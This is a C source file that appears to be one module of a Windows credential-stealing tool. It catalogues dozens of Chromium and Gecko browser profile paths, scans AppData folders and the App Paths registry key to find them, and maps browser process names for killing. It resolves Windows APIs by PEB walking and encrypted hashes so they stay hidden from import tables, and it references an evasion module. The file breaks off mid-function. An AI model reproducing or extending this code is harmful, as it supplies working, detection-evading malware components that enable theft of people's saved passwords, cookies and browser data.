#include "browser_paths.h"
#include "hash.h"
#include "nt_types.h"
#include "peb.h"
#include "export_resolve.h"
#include "hashes.h"
#include "config.h"
#include "file_utils.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

static int bp_strieq(const char *a, const char *b);
static int bp_is_dup(const BrowserPath *out, size_t n, const char *path, int roaming);

/* ── Process name mapping ─────────────────────────────────────── */
/* Each entry maps to the browser's actual executable stem (no .exe).
 * Browsers sharing an exe (e.g. Chrome variants → "chrome") map
 * to the same name so one kill_browser_processes("chrome") covers
 * Chrome, Chromium, CentBrowser, CryptoTab, etc.                    */

static const char *xor_process_names[] = {
    "chrome",       /* Chrome */
    "chrome",       /* Chrome (x86) */
    "chrome",       /* Chrome SxS (Canary) */
    "msedge",       /* Edge */
    "brave",        /* Brave */
    "opera",        /* Opera */
    "opera",        /* Opera GX */
    "vivaldi",      /* Vivaldi */
    "browser",      /* Yandex */
    "chrome",       /* Chromium */
    "chrome",       /* CentBrowser */
    "browser",      /* CocCoc */
    "amigo",        /* Amigo */
    "torch",        /* Torch */
    "kometa",       /* Kometa */
    "orbitum",      /* Orbitum */
    "chrome",       /* 7Star */
    "chrome",       /* Sputnik */
    "iridium",      /* Iridium */
    "dragon",       /* Comodo Dragon */
    "chrome",       /* Epic */
    "chrome",       /* Uran */
    "slimjet",      /* Slimjet */
    "chrome",       /* Chedot */
    "chrome",       /* Elements Browser */
    "chrome",       /* QIP Surf */
    "360se",        /* 360Browser */
    "chrome",       /* DCBrowser */
    "chrome",       /* UR Browser */
    "chrome",       /* MapleStudio ChromePlus */
    "fenrir",       /* Fenrir */
    "citrio",       /* CatalinaGroup Citrio */
    "chrome",       /* Coowon */
    "liebao",       /* Liebao */
    "maxthon",      /* Maxthon */
    "kmeleon",      /* K-Melon */
    "chrome",       /* Chrome Canary */
    "chrome",       /* Chrome Dev */
    "chrome",       /* Chrome Beta */
    "msedge",       /* Edge Beta */
    "msedge",       /* Edge Dev */
    "msedge",       /* Edge Canary */
    "brave",        /* Brave Beta */
    "brave",        /* Brave Nightly */
    "opera",        /* Opera Beta */
    "opera",        /* Opera Crypto */
    "chrome",       /* CryptoTab */
    "avastbrowser", /* Avast Secure Browser */
    "ccbrowser",    /* CCleaner Browser */
    "ucbrowser",    /* UC Browser */
    "qqbrowser",    /* QQ Browser */
    "360se",        /* 360 Browser */
    "liebao",       /* Liebao (dup) */
    "chrome",       /* Elements (dup) */
    "superbird",    /* Superbird */
    "sleipnir",     /* Sleipnir */
    "atom",         /* Mail.ru Atom */
    "chrome"        /* 7Star (dup) */
};

static const char *xor_names[] = {
    "Chrome", "Chrome (x86)", "Chrome SxS", "Edge", "Brave",
    "Opera", "Opera GX", "Vivaldi", "Yandex", "Chromium",
    "CentBrowser", "CocCoc", "Amigo", "Torch", "Kometa",
    "Orbitum", "7Star", "Sputnik", "Iridium", "Dragon",
    "Epic", "Uran", "Slimjet", "Chedot", "Elements Browser",
    "QIP Surf", "360Browser", "DCBrowser", "UR Browser", "Maple",
    "Fenrir", "Catalina", "Coowon", "Liebao", "Maxthon",
    "K-Melon", "Chrome Canary", "Chrome Dev", "Chrome Beta",
    "Edge Beta", "Edge Dev", "Edge Canary", "Brave Beta",
    "Brave Nightly", "Opera Beta", "Opera Crypto", "CryptoTab",
    "Avast Secure", "CCleaner", "UC Browser", "QQ Browser",
    "360 Browser", "Liebao", "Elements", "Superbird",
    "Sleipnir", "Mail.ru Atom", "7Star"
};

static const char *xor_paths[] = {
    "Google\\Chrome\\User Data",
    "Google(x86)\\Chrome\\User Data",
    "Google\\Chrome SxS\\User Data",
    "Microsoft\\Edge\\User Data",
    "BraveSoftware\\Brave-Browser\\User Data",
    "Opera Software\\Opera Stable",
    "Opera Software\\Opera GX Stable",
    "Vivaldi\\User Data",
    "Yandex\\YandexBrowser\\User Data",
    "Chromium\\User Data",
    "CentBrowser\\User Data",
    "CocCoc\\Browser\\User Data",
    "Amigo\\User Data",
    "Torch\\User Data",
    "Kometa\\User Data",
    "Orbitum\\User Data",
    "7Star\\7Star\\User Data",
    "Sputnik\\Sputnik\\User Data",
    "Iridium\\User Data",
    "Dragon\\User Data",
    "Epic Privacy Browser\\User Data",
    "Uran\\User Data",
    "Slimjet\\User Data",
    "Chedot\\User Data",
    "Elements Browser\\User Data",
    "QIP Surf\\User Data",
    "360Browser\\Browser\\User Data",
    "DCBrowser\\User Data",
    "UR Browser\\User Data",
    "MapleStudio\\ChromePlus\\User Data",
    "Fenrir\\User Data",
    "CatalinaGroup\\Citrio\\User Data",
    "Coowon\\User Data",
    "Liebao\\User Data",
    "Maxthon5\\User Data",
    "K-Melon\\User Data",
    "Chrome SxS\\User Data",
    "Chrome Dev\\User Data",
    "Chrome Beta\\User Data",
    "Edge Beta\\User Data",
    "Edge Dev\\User Data",
    "Edge Canary\\User Data",
    "Brave-Browser-Beta\\User Data",
    "Brave-Browser-Nightly\\User Data",
    "Opera Software\\Opera Beta",
    "Opera Software\\Opera Crypto",
    "CryptoTab\\User Data",
    "Avast Secure Browser\\User Data",
    "CCBrowser\\User Data",
    "UCBrowser\\User Data",
    "QQBrowser\\User Data",
    "360Browser\\Browser\\User Data",
    "Liebao\\User Data",
    "Elements Browser\\User Data",
    "Superbird\\User Data",
    "Sleipnir\\User Data",
    "Mail.ru\\Atom\\User Data",
    "7Star\\7Star\\User Data"
};

static BrowserPath browsers[58];
static int initialized = 0;

static void init_browsers(void) {
    if (initialized) return;
    for (int i = 0; i < 58; i++) {
        browsers[i].name         = xor_names[i];
        browsers[i].path_suffix  = xor_paths[i];
        browsers[i].use_roaming  = 0;
        browsers[i].process_name = xor_process_names[i];
    }
    /* Opera and Opera GX use APPDATA */
    browsers[5].use_roaming = 1;
    browsers[6].use_roaming = 1;
    initialized = 1;
}

/* ── Merged discovery buffers ─────────────────────────────────── */

/* Gecko browsers — process_name mapped to actual exe stems */
static const BrowserPath gecko_browsers[] = {
    {"Firefox",    "Mozilla\\Firefox\\Profiles",    1, "firefox"},
    {"Waterfox",   "Waterfox\\Profiles",            1, "waterfox"},
    {"Pale Moon",  "Moon\\Profiles",                1, "palemoon"},
    {"SeaMonkey",  "SeaMonkey\\Profiles",           1, "seamonkey"},
    {"IceDragon",  "Cyberfox\\Profiles",            1, "icedragon"},
    {"Basilisk",   "Basilisk\\Profiles",            1, "basilisk"},
    {"K-Meleon",   "K-Meleon\\Profiles",            1, "kmeleon"},
    {"GNU IceCat", "IceCat\\Profiles",              1, "icecat"},
    {"Swiftweasel","Swiftweasel\\Profiles",          1, "swiftweasel"},
    {"Floorp",     "Floorp\\Profiles",              1, "floorp"},
};

#define MAX_MERGED_BROWSERS 128

static BrowserPath merged_chromium[MAX_MERGED_BROWSERS];
static size_t merged_chromium_count = 0;
static int chromium_merged = 0;

static BrowserPath merged_gecko[MAX_MERGED_BROWSERS];
static size_t merged_gecko_count = 0;
static int gecko_merged = 0;

/*
 * get_chromium_browsers — merged discovery API.
 * 1. Registry-based scan (App Paths)
 * 2. Filesystem scan (%LOCALAPPDATA%, %APPDATA%, depth 2)
 * 3. Static 58-entry fallback table
 * Deduplicates by case-insensitive path_suffix comparison.
 */
const BrowserPath *get_chromium_browsers(size_t *count) {
    if (!chromium_merged) {
        init_browsers();
        merged_chromium_count = 0;

        /* 1. Registry discovery */
        discover_chromium_browsers_registry(merged_chromium,
                                            MAX_MERGED_BROWSERS,
                                            &merged_chromium_count);

        /* 2. Filesystem discovery (dedup on insert) */
        size_t fs_count = 0;
        BrowserPath fs_buf[64];
        discover_chromium_browsers_fs(fs_buf, 64, &fs_count);
        for (size_t i = 0; i < fs_count && merged_chromium_count < MAX_MERGED_BROWSERS; i++) {
            if (!bp_is_dup(merged_chromium, merged_chromium_count,
                           fs_buf[i].path_suffix, fs_buf[i].use_roaming)) {
                merged_chromium[merged_chromium_count++] = fs_buf[i];
            }
        }

        /* 3. Static fallback (dedup on insert) */
        for (int i = 0; i < 58 && merged_chromium_count < MAX_MERGED_BROWSERS; i++) {
            if (!bp_is_dup(merged_chromium, merged_chromium_count,
                           browsers[i].path_suffix, browsers[i].use_roaming)) {
                merged_chromium[merged_chromium_count++] = browsers[i];
            }
        }

        chromium_merged = 1;
    }

    *count = merged_chromium_count;
    return merged_chromium;
}

/*
 * get_gecko_browsers — merged discovery API.
 * 1. Filesystem scan (%APPDATA%, depth 2)
 * 2. Static 10-entry fallback table
 */
const BrowserPath *get_gecko_browsers(size_t *count) {
    if (!gecko_merged) {
        merged_gecko_count = 0;

        /* 1. Filesystem discovery */
        discover_gecko_browsers_fs(merged_gecko, MAX_MERGED_BROWSERS,
                                   &merged_gecko_count);

        /* 2. Static fallback (dedup on insert) */
        for (size_t i = 0; i < 10 && merged_gecko_count < MAX_MERGED_BROWSERS; i++) {
            if (!bp_is_dup(merged_gecko, merged_gecko_count,
                           gecko_browsers[i].path_suffix, gecko_browsers[i].use_roaming)) {
                merged_gecko[merged_gecko_count++] = gecko_browsers[i];
            }
        }

        gecko_merged = 1;
    }

    *count = merged_gecko_count;
    return merged_gecko;
}

/* ════════════════════════════════════════════════════════════════
 *  Dynamic FS-based Chromium browser discovery
 *  Scans %LOCALAPPDATA% and %APPDATA% recursively (depth ≤2)
 *  for directories containing a "Local State" file.
 *  Uses PEB-walk hash-resolved FindFirstFileW/FindNextFileW.
 * ════════════════════════════════════════════════════════════════ */

/* Resolved Win32 API signatures */
typedef DWORD  (*fn_genvw)(const WCHAR *, WCHAR *, DWORD);
typedef HANDLE (*fn_fffw)(const WCHAR *, WIN32_FIND_DATAW *);
typedef BOOL   (*fn_ffnw)(HANDLE, WIN32_FIND_DATAW *);
typedef BOOL   (*fn_fcl)(HANDLE);

/* ── Small helpers ────────────────────────────────────────── */

static int bp_strieq(const char *a, const char *b)
{
    while (*a && *b) {
        char ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

static int bp_is_dup(const BrowserPath *out, size_t n,
                     const char *path, int roaming)
{
    for (size_t i = 0; i < n; i++)
        if (out[i].use_roaming == roaming && bp_strieq(out[i].path_suffix, path))
            return 1;
    return 0;
}

/*
 * Derive display name from path suffix.
 *   "Google\\Chrome\\User Data"                → "Chrome"
 *   "BraveSoftware\\Brave-Browser\\User Data"   → "Brave-Browser"
 *   "Vivaldi\\User Data"                       → "Vivaldi"
 *   "Opera Software\\Opera Stable"              → "Opera Stable"
 */
static void bp_derive_name(char *dst, size_t cap, const char *path)
{
    const char *s1 = NULL, *s2 = NULL;
    for (const char *p = path; *p; p++)
        if (*p == '\\') { s1 = s2; s2 = p; }

    const char *last = s2 ? s2 + 1 : path;

    if (strcmp(last, "User Data") == 0) {
        if (s1) {
            /* "Google\\Chrome\\User Data" → copy between s1+1 and s2 */
            const char *start = s1 + 1;
            size_t len = (size_t)(s2 - start);
            if (len >= cap) len = cap - 1;
            memcpy(dst, start, len);
            dst[len] = '\0';
        } else if (s2) {
            /* "Vivaldi\\User Data" → copy from start to s2 */
            size_t len = (size_t)(s2 - path);
            if (len >= cap) len = cap - 1;
            memcpy(dst, path, len);
            dst[len] = '\0';
        } else {
            if (cap > 1) { dst[0] = '?'; dst[1] = '\0'; }
        }
    } else {
        size_t len = strlen(last);
        if (len >= cap) len = cap - 1;
        memcpy(dst, last, len);
        dst[len] = '\0';
    }
}

/* Wide-string helpers (stack buffers, no alloc) */
static int bp_wlen(const WCHAR *w)
{
    int n = 0; while (w[n]) n++; return n;
}

static void bp_wappend(WCHAR *dst, int cap, const WCHAR *src)
{
    int pos = bp_wlen(dst);
    for (int j = 0; src[j] && pos < cap - 1; j++)
        dst[pos++] = src[j];
    dst[pos] = 0;
}

static void bp_wtoa(const WCHAR *w, char *a, size_t cap)
{
    size_t i = 0;
    while (w[i] && i < cap - 1) { a[i] = (w[i] < 128) ? (char)w[i] : '?'; i++; }
    a[i] = '\0';
}

/* ── Recursive directory scanner ──────────────────────────── */

static void bp_fs_scan(
    WCHAR *dir_w, char *dir_n,
    int depth, int max_depth, int roaming,
    BrowserPath *out, size_t cap, size_t *cnt,
    fn_fffw pFF, fn_ffnw pFN, fn_fcl pFC)
{
    if (depth > max_depth || *cnt >= cap) return;

    int    wlen = bp_wlen(dir_w);
    size_t nlen = strlen(dir_n);

    /* 1. Probe: does dir\\Local State exist? */
    bp_wappend(dir_w, MAX_PATH, L"\\Local State");

    WIN32_FIND_DATAW fd;
    HANDLE h = pFF(dir_w, &fd);
    dir_w[wlen] = 0;                         /* restore */

    if (h != INVALID_HANDLE_VALUE) {
        pFC(h);
        if (!bp_is_dup(out, *cnt, dir_n, roaming) && *cnt < cap) {
            char name[64];
            bp_derive_name(name, sizeof(name), dir_n);
            char *pc = (char *)malloc(nlen + 1);
            char *nc = (char *)malloc(strlen(name) + 1);
            if (pc && nc) {
                memcpy(pc, dir_n, nlen + 1);
                strcpy(nc, name);
                out[*cnt].name        = nc;
                out[*cnt].path_suffix = pc;
                out[*cnt].use_roaming = roaming;
                (*cnt)++;
            } else {
                free(pc);
                free(nc);
            }
        }
        return;                              /* leaf — don't recurse deeper */
    }

    /* 2. Enumerate subdirectories */
    bp_wappend(dir_w, MAX_PATH, L"\\*");
    h = pFF(dir_w, &fd);
    dir_w[wlen] = 0;                         /* restore */
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == L'.') {
            if (fd.cFileName[1] == 0) continue;
            if (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0) continue;
        }

        /* Build child wide path */
        bp_wappend(dir_w, MAX_PATH, L"\\");
        bp_wappend(dir_w, MAX_PATH, fd.cFileName);

        /* Build child narrow path */
        size_t pos = nlen;
        if (pos < MAX_PATH - 1) dir_n[pos++] = '\\';
        for (int wi = 0; fd.cFileName[wi] && pos < MAX_PATH - 1; wi++)
            dir_n[pos++] = (fd.cFileName[wi] < 128) ? (char)fd.cFileName[wi] : '?';
        dir_n[pos] = '\0';

        bp_fs_scan(dir_w, dir_n, depth + 1, max_depth, roaming,
                   out, cap, cnt, pFF, pFN, pFC);

        /* Restore buffers for next iteration */
        dir_w[wlen] = 0;
        dir_n[nlen] = '\0';
    } while (pFN(h, &fd) && *cnt < cap);

    pFC(h);
}

/* ── Public entry point ───────────────────────────────────── */

int discover_chromium_browsers_fs(BrowserPath *out, size_t max_out, size_t *count)
{
    if (!out || !max_out) return -1;
    *count = 0;

    /* Resolve kernel32 via PEB walk */
    void *k32 = mirage_get_module_by_hash(
        mirage_encrypted_hash_module("kernel32.dll"));
    if (!k32) return -1;

    /* Resolve needed functions by hash (no plaintext names in IAT) */
    fn_genvw pGetEnv = (fn_genvw)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("GetEnvironmentVariableW"));
    fn_fffw pFF = (fn_fffw)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("FindFirstFileW"));
    fn_ffnw pFN = (fn_ffnw)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("FindNextFileW"));
    fn_fcl  pFC = (fn_fcl)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("FindClose"));
    if (!pGetEnv || !pFF || !pFN || !pFC) return -1;

    WCHAR base_w[MAX_PATH];
    char  base_n[MAX_PATH];

    /* Scan %LOCALAPPDATA% (roaming = 0) */
    if (pGetEnv(L"LOCALAPPDATA", base_w, MAX_PATH) > 0) {
        bp_wtoa(base_w, base_n, MAX_PATH);
        bp_fs_scan(base_w, base_n, 0, 2, 0,
                   out, max_out, count, pFF, pFN, pFC);
    }

    /* Scan %APPDATA% (roaming = 1) */
    if (pGetEnv(L"APPDATA", base_w, MAX_PATH) > 0) {
        bp_wtoa(base_w, base_n, MAX_PATH);
        bp_fs_scan(base_w, base_n, 0, 2, 1,
                   out, max_out, count, pFF, pFN, pFC);
    }

    return 0;
}

/* ════════════════════════════════════════════════════════════════ *
 *  discover_gecko_browsers_fs — filesystem-based Gecko discovery  *
 *  Scans %APPDATA% at depth ≤2 for directories containing         *
 *  profiles.ini. Derives browser name from directory name.         *
 * ════════════════════════════════════════════════════════════════ */

#ifdef _WIN32

#include <windows.h>

/* String pool — BrowserPath stores const char*, so discovered names
 * and paths must live in static storage. */
#define GECKO_FS_MAX    64
#define GECKO_NAME_LEN  128
#define GECKO_PATH_LEN  512

static char g_gecko_names[GECKO_FS_MAX][GECKO_NAME_LEN];
static char g_gecko_suffixes[GECKO_FS_MAX][GECKO_PATH_LEN];
static size_t g_gecko_pool_idx = 0;

static void *gecko_resolve_fn(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

/* Wide-to-narrow (ASCII-safe for browser dir names). Returns char count. */
static int gecko_wton(const WCHAR *w, char *dst, size_t cap) {
    size_t i = 0;
    while (w[i] && i < cap - 1) { dst[i] = (char)(w[i] & 0x7F); i++; }
    dst[i] = 0;
    return (int)i;
}

/* Case-insensitive duplicate check against already-added entries. */
static int gecko_is_dup(const BrowserPath *out, size_t n, const char *suffix) {
    for (size_t i = 0; i < n; i++)
        if (_stricmp(out[i].path_suffix, suffix) == 0) return 1;
    return 0;
}

int discover_gecko_browsers_fs(BrowserPath *out, size_t max_out, size_t *count)
{
    if (!out || !count || max_out == 0) return -1;
    *count = 0;

    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
    if (!k32) return -1;

    typedef DWORD  (WINAPI *FnGetEnvW)(LPCWSTR, LPWSTR, DWORD);
    typedef HANDLE (WINAPI *FnFindFirstW)(LPCWSTR, LPWIN32_FIND_DATAW);
    typedef BOOL   (WINAPI *FnFindNextW)(HANDLE, LPWIN32_FIND_DATAW);
    typedef BOOL   (WINAPI *FnFindClose)(HANDLE);

    FnGetEnvW    pGetEnvW    = (FnGetEnvW)   gecko_resolve_fn(k32, "GetEnvironmentVariableW");
    FnFindFirstW pFindFirstW = (FnFindFirstW) gecko_resolve_fn(k32, "FindFirstFileW");
    FnFindNextW  pFindNextW  = (FnFindNextW)  gecko_resolve_fn(k32, "FindNextFileW");
    FnFindClose  pFindClose  = (FnFindClose)  gecko_resolve_fn(k32, "FindClose");
    if (!pGetEnvW || !pFindFirstW || !pFindNextW || !pFindClose) return -1;

    /* ── Get %APPDATA% ──────────────────────────────────────────── */
    WCHAR appdata[MAX_PATH + 1];
    DWORD alen = pGetEnvW(L"APPDATA", appdata, MAX_PATH);
    if (alen == 0 || alen >= MAX_PATH) return 0;  /* no APPDATA → success, 0 found */
    appdata[alen] = 0;

    /* Build depth-1 search pattern: appdata\* */
    WCHAR search[MAX_PATH + 1];
    memcpy(search, appdata, alen * sizeof(WCHAR));
    search[alen]     = L'\\';
    search[alen + 1] = L'*';
    search[alen + 2] = 0;

    WIN32_FIND_DATAW fd;
    HANDLE h = pFindFirstW(search, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;

    /* Wide string L"\\profiles.ini" for file-existence probe */
    static const WCHAR w_pi[] = L"\\profiles.ini";
    const size_t w_pi_len = 13;  /* wcslen(w_pi) */

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        /* Skip "." and ".." */
        if (fd.cFileName[0] == L'.' &&
            (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)))
            continue;

        char dname[128];
        if (!gecko_wton(fd.cFileName, dname, sizeof(dname)) || !dname[0]) continue;

        /* ── Depth 1: appdata\<dir>\profiles.ini ────────────────── */
        WCHAR probe[MAX_PATH + 1];
        size_t pos = alen;
        memcpy(probe, appdata, pos * sizeof(WCHAR));
        probe[pos++] = L'\\';
        for (const WCHAR *p = fd.cFileName; *p; p++)
            probe[pos++] = *p;
        memcpy(probe + pos, w_pi, (w_pi_len + 1) * sizeof(WCHAR));
        pos += w_pi_len;
        probe[pos] = 0;

        WIN32_FIND_DATAW fpi;
        HANDLE hp = pFindFirstW(probe, &fpi);
        if (hp != INVALID_HANDLE_VALUE) {
            pFindClose(hp);
            if (*count < max_out && g_gecko_pool_idx < GECKO_FS_MAX) {
                size_t idx = g_gecko_pool_idx;
                strncpy(g_gecko_names[idx], dname, GECKO_NAME_LEN - 1);
                g_gecko_names[idx][GECKO_NAME_LEN - 1] = 0;
                snprintf(g_gecko_suffixes[idx], GECKO_PATH_LEN, "%s\\Profiles", dname);
                if (!gecko_is_dup(out, *count, g_gecko_suffixes[idx])) {
                    out[*count].name         = g_gecko_names[idx];
                    out[*count].path_suffix  = g_gecko_suffixes[idx];
                    out[*count].use_roaming  = 1;
                    out[*count].process_name = NULL;
                    (*count)++;
                    g_gecko_pool_idx++;
                }
            }
        }

        /* ── Depth 2: appdata\<dir>\<subdir>\profiles.ini ──────── */
        WCHAR search2[MAX_PATH + 1];
        pos = alen;
        memcpy(search2, appdata, pos * sizeof(WCHAR));
        search2[pos++] = L'\\';
        for (const WCHAR *p = fd.cFileName; *p; p++)
            search2[pos++] = *p;
        search2[pos++] = L'\\';
        search2[pos++] = L'*';
        search2[pos]   = 0;

        WIN32_FIND_DATAW fd2;
        HANDLE h2 = pFindFirstW(search2, &fd2);
        if (h2 == INVALID_HANDLE_VALUE) continue;

        do {
            if (!(fd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (fd2.cFileName[0] == L'.' &&
                (fd2.cFileName[1] == 0 || (fd2.cFileName[1] == L'.' && fd2.cFileName[2] == 0)))
                continue;

            char dname2[128];
            if (!gecko_wton(fd2.cFileName, dname2, sizeof(dname2)) || !dname2[0]) continue;

            /* Probe: appdata\<dir>\<subdir>\profiles.ini */
            WCHAR probe2[MAX_PATH + 1];
            pos = alen;
            memcpy(probe2, appdata, pos * sizeof(WCHAR));
            probe2[pos++] = L'\\';
            for (const WCHAR *p = fd.cFileName; *p; p++)
                probe2[pos++] = *p;
            probe2[pos++] = L'\\';
            for (const WCHAR *p = fd2.cFileName; *p; p++)
                probe2[pos++] = *p;
            memcpy(probe2 + pos, w_pi, (w_pi_len + 1) * sizeof(WCHAR));
            pos += w_pi_len;
            probe2[pos] = 0;

            WIN32_FIND_DATAW fpi2;
            HANDLE hp2 = pFindFirstW(probe2, &fpi2);
            if (hp2 != INVALID_HANDLE_VALUE) {
                pFindClose(hp2);
                if (*count < max_out && g_gecko_pool_idx < GECKO_FS_MAX) {
                    size_t idx = g_gecko_pool_idx;
                    strncpy(g_gecko_names[idx], dname2, GECKO_NAME_LEN - 1);
                    g_gecko_names[idx][GECKO_NAME_LEN - 1] = 0;
                    snprintf(g_gecko_suffixes[idx], GECKO_PATH_LEN,
                             "%s\\%s\\Profiles", dname, dname2);
                    if (!gecko_is_dup(out, *count, g_gecko_suffixes[idx])) {
                        out[*count].name         = g_gecko_names[idx];
                        out[*count].path_suffix  = g_gecko_suffixes[idx];
                        out[*count].use_roaming  = 1;
                        out[*count].process_name = NULL;
                        (*count)++;
                        g_gecko_pool_idx++;
                    }
                }
            }
        } while (pFindNextW(h2, &fd2));
        pFindClose(h2);

    } while (pFindNextW(h, &fd));
    pFindClose(h);

    return 0;
}

#endif /* _WIN32 */

/* ═══════ Registry-based Chromium discovery ════════════════════ *
 *
 * Scans HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
 * for .exe entries whose exe_dir contains a "User Data\Local State".
 * PEB-walk hash resolution only — no IAT imports for NT APIs.
 */

/* ── UNICODE_STRING helper (same as evasion.c) ──────────────── */
static void bp_init_unicode_string(const char *s, size_t len,
                                   UNICODE_STRING *us, WCHAR *buf,
                                   size_t buf_count)
{
    size_t cap = buf_count < len + 1 ? buf_count : len + 1;
    for (size_t i = 0; i < cap; i++)
        buf[i] = 0;
    size_t n = len < buf_count ? len : buf_count;
    for (size_t i = 0; i < n; i++)
        buf[i] = (WCHAR)(unsigned char)s[i];
    us->Length        = (USHORT)(n * sizeof(WCHAR));
    us->MaximumLength = (USHORT)(cap * sizeof(WCHAR));
    us->Buffer        = buf;
}

/* ── Duplicate-check: case-insensitive path match ───────────── */
static int bp_path_exists(const BrowserPath *arr, size_t count,
                          const char *path)
{
    for (size_t i = 0; i < count; i++) {
        if (_stricmp(arr[i].path_suffix, path) == 0)
            return 1;
    }
    return 0;
}

/* ── Wide-to-narrow (truncate low byte) ─────────────────────── */
static void bp_wchar_to_char(const WCHAR *src, size_t src_len,
                             char *dst, size_t dst_max)
{
    size_t n = src_len < dst_max - 1 ? src_len : dst_max - 1;
    for (size_t i = 0; i < n; i++)
        dst[i] = (char)(unsigned char)src[i];
    dst[n] = 0;
}

int discover_chromium_browsers_registry(BrowserPath *out,
                                        size_t max_out,
                                        size_t *count)
{
    *count = 0;

    /* ── Resolve ntdll exports via PEB walk ──────────────────── */
    void *ntdll = mirage_get_module_by_hash(
        mirage_encrypted_hash_module("ntdll.dll"));
    if (!ntdll) return 0;

    typedef NTSTATUS (*pNtOpenKey)(HANDLE *, ULONG, PVOID);
    typedef NTSTATUS (*pNtEnumerateKey)(HANDLE, ULONG, ULONG,
                                       PVOID, ULONG, ULONG *);
    typedef NTSTATUS (*pNtQueryValueKey)(HANDLE, PVOID, ULONG,
                                        PVOID, ULONG, ULONG *);
    typedef NTSTATUS (*pNtClose)(HANDLE);

    pNtOpenKey fnOpenKey =
        (pNtOpenKey)mirage_get_function_by_hash(ntdll, HASH_OpenKey);
    pNtEnumerateKey fnEnumKey =
        (pNtEnumerateKey)mirage_get_function_by_hash(
            ntdll, HASH_EnumerateKey);
    pNtQueryValueKey fnQueryVal =
        (pNtQueryValueKey)mirage_get_function_by_hash(
            ntdll, HASH_QueryValueKey);
    pNtClose fnClose =
        (pNtClose)mirage_get_function_by_hash(ntdll, HASH_Close);

    if (!fnOpenKey || !fnEnumKey || !fnQueryVal || !fnClose)
        return 0;

    /* ── Registry path (narrow → wide) ───────────────────────── */
    static const char reg_path[] =
        "\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows"
        "\\CurrentVersion\\App Paths";

    WCHAR us_buf[512];
    UNICODE_STRING us;
    bp_init_unicode_string(reg_path, strlen(reg_path), &us, us_buf, 512);

    /* ── Scan both native and WOW64 views ────────────────────── */
    ULONG views[] = {
        KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_WOW64_64KEY,
        KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_WOW64_32KEY
    };

    for (int v = 0; v < 2; v++) {
        OBJECT_ATTRIBUTES oa;
        memset(&oa, 0, sizeof(oa));
        oa.Length     = sizeof(OBJECT_ATTRIBUTES);
        oa.ObjectName = &us;
        oa.Attributes = OBJ_CASE_INSENSITIVE;

        HANDLE key = NULL;
        if (fnOpenKey(&key, views[v], &oa) < 0)
            continue;
        if (!key)
            continue;

        /* ── Enumerate subkeys ────────────────────────────────── */
        uint8_t enum_buf[1024];
        ULONG idx = 0;

        for (;;) {
            ULONG result_len = 0;
            NTSTATUS es = fnEnumKey(key, idx, KeyBasicInformation,
                                    enum_buf, sizeof(enum_buf),
                                    &result_len);

            if (es == (NTSTATUS)0x8000001A /* STATUS_NO_MORE_ENTRIES */)
                break;
            if (es < 0) {
                idx++;
                continue;
            }

            PKEY_BASIC_INFORMATION kbi =
                (PKEY_BASIC_INFORMATION)enum_buf;

            /* ── Convert subkey name to narrow ────────────────── */
            char subkey_name[256];
            bp_wchar_to_char(kbi->Name, kbi->NameLength / sizeof(WCHAR),
                             subkey_name, sizeof(subkey_name));

            /* Only care about .exe entries */
            size_t name_len = strlen(subkey_name);
            if (name_len < 5 || _stricmp(subkey_name + name_len - 4, ".exe") != 0) {
                idx++;
                continue;
            }

            /* ── Open the subkey and read default (empty name) value ─ */
            WCHAR subkey_buf[256];
            UNICODE_STRING subkey_us;
            bp_init_unicode_string(subkey_name, name_len,
                                   &subkey_us, subkey_buf, 256);

            OBJECT_ATTRIBUTES sub_oa;
            memset(&sub_oa, 0, sizeof(sub_oa));
            sub_oa.Length        = sizeof(OBJECT_ATTRIBUTES);
            sub_oa.RootDirectory = key;
            sub_oa.ObjectName    = &subkey_us;
            sub_oa.Attributes    = OBJ_CASE_INSENSITIVE;

            HANDLE sub_key = NULL;
            if (fnOpenKey(&sub_key,
                          KEY_QUERY_VALUE | (views[v] & 0xFF00),
                          &sub_oa) < 0 || !sub_key) {
                idx++;
                continue;
            }

            /* Read default value (empty value name) */
            WCHAR val_name_buf = 0;
            UNICODE_STRING val_name;
            val_name.Length        = 0;
            val_name.MaximumLength = sizeof(WCHAR);
            val_name.Buffer        = &val_name_buf;

            uint8_t val_buf[2048];
            ULONG val_len = 0;
            NTSTATUS qs = fnQueryVal(
                sub_key, &val_name, KeyValuePartialInformation,
                val_buf, sizeof(val_buf), &val_len);

            fnClose(sub_key);

            if (qs < 0) {
                idx++;
                continue;
            }

            PKEY_VALUE_PARTIAL_INFORMATION kvpi =
                (PKEY_VALUE_PARTIAL_INFORMATION)val_buf;

            if (kvpi->Type != 1 /* REG_SZ */ || kvpi->DataLength < 4) {
                idx++;
                continue;
            }

            /* ── Convert exe path to narrow ───────────────────── */
            char exe_path[1024];
            bp_wchar_to_char(
                (const WCHAR *)kvpi->Data,
                (kvpi->DataLength / sizeof(WCHAR)) - 1,
                exe_path, sizeof(exe_path));

            if (exe_path[0] == 0) {
                idx++;
                continue;
            }

            /* ── Derive exe_dir ───────────────────────────────── */
            char exe_dir[1024];
            strncpy(exe_dir, exe_path, sizeof(exe_dir) - 1);
            exe_dir[sizeof(exe_dir) - 1] = 0;
            char *last_slash = strrchr(exe_dir, '\\');
